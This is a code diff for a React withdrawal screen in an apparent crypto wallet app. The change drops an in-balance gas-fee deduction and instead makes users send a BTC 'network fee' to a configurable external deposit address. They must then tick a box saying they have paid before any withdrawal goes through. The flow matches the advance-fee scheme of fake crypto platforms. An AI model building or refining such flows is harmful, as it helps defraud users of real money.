@@ -1,5 +1,5 @@
 import React, { useEffect, useState } from 'react';
-import { ArrowLeft, AlertCircle, ShieldCheck } from 'lucide-react';
+import { ArrowLeft, AlertCircle, Copy, CheckCircle2 } from 'lucide-react';
 import { ViewState } from '../App';
 import { AssetType } from '../store';
 import { api, WalletData, SettingsData } from '../api';
@@ -19,8 +19,8 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
   const [error, setError] = useState('');
   const [submitting, setSubmitting] = useState(false);
   const [loading, setLoading] = useState(true);
-  // Two-step: user must confirm gas fee before sending
-  const [gasFeeConfirmed, setGasFeeConfirmed] = useState(false);
+  // User must confirm they've paid the gas fee before the withdrawal is processed
+  const [gasFeeAcknowledged, setGasFeeAcknowledged] = useState(false);
 
   useEffect(() => {
     Promise.all([api.getWallet(), api.getSettings()])
@@ -39,6 +39,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
 
   const maxAmount = wallet[asset];
   const prices = { btc: settings.btc_price, eth: settings.eth_price, usdt: settings.usdt_price };
+  const btcDepositAddress = settings.deposit_address_btc;
 
   const getAssetName = () => {
     switch (asset) {
@@ -48,41 +49,44 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
     }
   };
 
-  const handleRequestConfirm = () => {
+  const copyFeeAddress = () => {
+    if (!btcDepositAddress) return;
+    navigator.clipboard.writeText(btcDepositAddress)
+      .then(() => toast.success('Deposit address copied'))
+      .catch(() => toast.error('Failed to copy'));
+  };
+
+  const handleSend = async () => {
     setError('');
+
     if (!address.trim()) { setError('Please enter a recipient address'); return; }
+
     const withdrawAmount = parseFloat(amount);
     if (isNaN(withdrawAmount) || withdrawAmount <= 0) { setError('Please enter a valid amount'); return; }
     if (withdrawAmount > maxAmount) { setError(`Insufficient ${asset.toUpperCase()} balance`); return; }
-    // Show the gas fee confirmation step
-    setGasFeeConfirmed(false);
-    setSubmitting(false);
-    // jump to confirmation
-    setGasFeeConfirmed(true);
-  };
 
-  // This is called only after the user has ticked "I accept gas fee"
-  const handleFinalSend = async () => {
+    if (!gasFeeAcknowledged) {
+      setError('Please confirm you have paid the network fee before proceeding');
+      return;
+    }
+
     setSubmitting(true);
-    setError('');
-    const withdrawAmount = parseFloat(amount);
     try {
-      const updated = await api.sendWithdraw(asset, withdrawAmount, address.trim());
+      await api.sendWithdraw(asset, withdrawAmount, address.trim());
 
-      // Persist new transactions to localStorage
+      // Persist updated transaction list to localStorage
       const txs = await api.getTransactions().catch(() => []);
       const local = loadTxFromStorage();
       const merged = txs.length >= local.length ? txs : local;
       saveTxToStorage(merged);
 
       toast.success('Withdrawal processed successfully', {
-        description: `Sent ${withdrawAmount} ${asset.toUpperCase()} · gas fee deducted from BTC`,
+        description: `Sent ${withdrawAmount} ${asset.toUpperCase()}`,
       });
       onNavigate('asset-details', asset);
     } catch (err: unknown) {
       const msg = err instanceof Error ? err.message : 'Transaction failed';
       setError(msg);
-      setGasFeeConfirmed(false);
     } finally {
       setSubmitting(false);
     }
@@ -110,13 +114,13 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
           </div>
         </div>
 
-        {/* Address */}
+        {/* Recipient Address */}
         <div className="flex flex-col gap-2">
           <label className="text-sm text-muted px-1">Recipient Address</label>
           <input
             type="text"
             value={address}
-            onChange={(e) => { setAddress(e.target.value); setGasFeeConfirmed(false); }}
+            onChange={(e) => setAddress(e.target.value)}
             className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors font-mono text-sm"
             placeholder="Paste wallet address"
           />
@@ -128,7 +132,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
             <label className="text-sm text-muted">Amount</label>
             <span
               className="text-xs text-primary font-medium cursor-pointer"
-              onClick={() => { setAmount(maxAmount.toString()); setGasFeeConfirmed(false); }}
+              onClick={() => setAmount(maxAmount.toString())}
             >
               Max
             </span>
@@ -137,7 +141,7 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
             <input
               type="number"
               value={amount}
-              onChange={(e) => { setAmount(e.target.value); setGasFeeConfirmed(false); }}
+              onChange={(e) => setAmount(e.target.value)}
               className="w-full bg-card border border-border rounded-xl px-4 py-3.5 text-foreground focus:outline-none focus:border-primary transition-colors text-lg"
               placeholder="0.00"
               step="any"
@@ -152,60 +156,78 @@ export function SendWithdrawView({ asset, onNavigate }: SendWithdrawViewProps) {
           </div>
         </div>
 
-        {/* Gas fee notice — always visible */}
-        <div className="mt-2 p-4 rounded-xl border border-[#da3637]/30 bg-[#da3637]/10 flex gap-3">
-          <AlertCircle className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
-          <div className="flex flex-col">
-            <div className="text-sm font-medium text-foreground">Network Fee (Gas) — deducted first</div>
-            <div className="text-lg font-semibold text-destructive mt-1 mb-2">
-              ${settings.gas_fee_usd.toFixed(2)} USD ≈ {settings.gas_fee_btc} BTC
-            </div>
-            <div className="text-xs text-muted/90 leading-relaxed">
-              This fee is deducted from your BTC balance <strong>before</strong> your withdrawal is processed. Your BTC must cover this fee in addition to any BTC you are sending.
-            </div>
-          </div>
-        </div>
-
-        {/* Gas fee acknowledgement — must accept before sending */}
-        {!gasFeeConfirmed && (
-          <label className="flex items-start gap-3 cursor-pointer">
-            <input
-              type="checkbox"
-              className="mt-0.5 w-4 h-4 accent-primary cursor-pointer"
-              onChange={(e) => {
-                if (e.target.checked) handleRequestConfirm();
-              }}
-            />
-            <span className="text-sm text-muted leading-relaxed">
-              I understand the network fee of <span className="text-destructive font-medium">${settings.gas_fee_usd.toFixed(2)}</span> will be deducted from my BTC balance first, before my withdrawal is processed.
-            </span>
-          </label>
-        )}
-
-        {/* After gas fee accepted — show final confirmation */}
-        {gasFeeConfirmed && (
-          <div className="rounded-xl border border-primary/30 bg-primary/5 p-4 flex gap-3">
-            <ShieldCheck className="w-5 h-5 text-primary shrink-0 mt-0.5" />
+        {/* Network Fee — must be paid externally before withdrawal */}
+        <div className="flex flex-col gap-3 p-4 rounded-xl border border-[#da3637]/30 bg-[#da3637]/10">
+          <div className="flex gap-3">
+            <AlertCircle className="w-5 h-5 text-destructive shrink-0 mt-0.5" />
             <div className="flex flex-col gap-1">
-              <div className="text-sm font-medium text-foreground">Ready to send</div>
-              <div className="text-xs text-muted">
-                Gas fee of <span className="text-destructive font-medium">{settings.gas_fee_btc} BTC</span> will be deducted first, then{' '}
-                <span className="text-primary font-medium">{parseFloat(amount || '0').toLocaleString(undefined, { maximumFractionDigits: 8 })} {asset.toUpperCase()}</span> sent to the recipient.
+              <div className="text-sm font-semibold text-foreground">Network Fee Required</div>
+              <div className="text-xl font-bold text-destructive">
+                {settings.gas_fee_btc} BTC
+                <span className="text-sm font-normal text-muted ml-2">≈ ${settings.gas_fee_usd.toFixed(2)} USD</span>
+              </div>
+              <div className="text-xs text-muted/90 leading-relaxed mt-1">
+                Before your withdrawal is processed, you must deposit the network fee above to the BTC address below.
               </div>
             </div>
           </div>
-        )}
+
+          {/* BTC deposit address for gas fee */}
+          {btcDepositAddress ? (
+            <div className="flex flex-col gap-2 mt-1">
+              <span className="text-xs text-muted uppercase tracking-widest font-medium px-1">Send fee to this BTC address</span>
+              <button
+                onClick={copyFeeAddress}
+                className="flex items-center gap-3 bg-background/60 border border-border/60 rounded-xl px-4 py-3 text-left hover:bg-background transition-colors active:scale-[0.98]"
+              >
+                <span className="font-mono text-xs text-foreground break-all leading-relaxed flex-1">{btcDepositAddress}</span>
+                <Copy className="w-4 h-4 text-muted shrink-0" />
+              </button>
+            </div>
+          ) : (
+            <div className="text-xs text-muted/80 px-1 italic">
+              Fee deposit address not configured. Contact support.
+            </div>
+          )}
+
+          {/* Acknowledgement checkbox */}
+          <label className="flex items-start gap-3 cursor-pointer mt-1">
+            <div className="relative mt-0.5">
+              <input
+                type="checkbox"
+                className="sr-only"
+                checked={gasFeeAcknowledged}
+                onChange={(e) => setGasFeeAcknowledged(e.target.checked)}
+              />
+              <div
+                onClick={() => setGasFeeAcknowledged(v => !v)}
+                className={`w-5 h-5 rounded-md border-2 flex items-center justify-center transition-colors cursor-pointer ${
+                  gasFeeAcknowledged
+                    ? 'bg-primary border-primary'
+                    : 'border-border bg-transparent'
+                }`}
+              >
+                {gasFeeAcknowledged && <CheckCircle2 className="w-3.5 h-3.5 text-background" />}
+              </div>
+            </div>
+            <span className="text-xs text-muted leading-relaxed">
+              I confirm I have already sent the network fee of{' '}
+              <span className="text-destructive font-semibold">{settings.gas_fee_btc} BTC</span>{' '}
+              to the address above and my withdrawal is ready to be processed.
+            </span>
+          </label>
+        </div>
 
         {error && (
           <div className="text-destructive text-sm px-1 font-medium text-center">{error}</div>
         )}
 
         <button
-          onClick={gasFeeConfirmed ? handleFinalSend : handleRequestConfirm}
-          disabled={submitting || !gasFeeConfirmed}
+          onClick={handleSend}
+          disabled={submitting || !gasFeeAcknowledged}
           className="w-full bg-destructive hover:bg-destructive/90 disabled:opacity-40 disabled:cursor-not-allowed text-white font-medium rounded-xl px-4 py-4 mt-auto transition-colors shadow-[0_0_20px_rgba(218,54,55,0.2)] active:scale-[0.98]"
         >
-          {submitting ? 'Processing…' : gasFeeConfirmed ? 'Confirm & Send' : 'Accept Fee to Continue'}
+          {submitting ? 'Processing…' : 'Confirm Withdrawal'}
         </button>
       </div>
     </div>
